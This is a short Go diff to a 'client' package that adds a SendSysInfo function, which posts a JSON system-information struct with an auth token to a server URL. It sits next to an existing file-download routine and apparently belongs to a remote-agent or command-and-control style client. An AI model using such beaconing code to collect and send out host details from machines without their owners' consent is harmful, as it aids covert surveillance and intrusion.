@@ -2,6 +2,7 @@ package client
 
 import (
 	"bytes"
+	"encoding/json"
 	"io"
 	"log"
 	"mime/multipart"
@@ -80,4 +81,18 @@ func DownloadFile(client *http.Client, url string, filePath string) {
 		return
 	}
 	log.Println("[+] Successfully downloaded file")
+}
+
+func SendSysInfo(client *http.Client, url string, sysInfo SysInfo) {
+	data, _ := json.Marshal(sysInfo)
+	req, err := http.NewRequest("POST", url, bytes.NewBuffer(data))
+	if err != nil {
+		log.Printf("[-] Error creating the POST request: %s\n", err)
+		return
+	}
+
+	req.Header.Add("Token", ClientToken)
+	req.Header.Set("Content-Type", "application/json")
+
+	client.Do(req)
 }
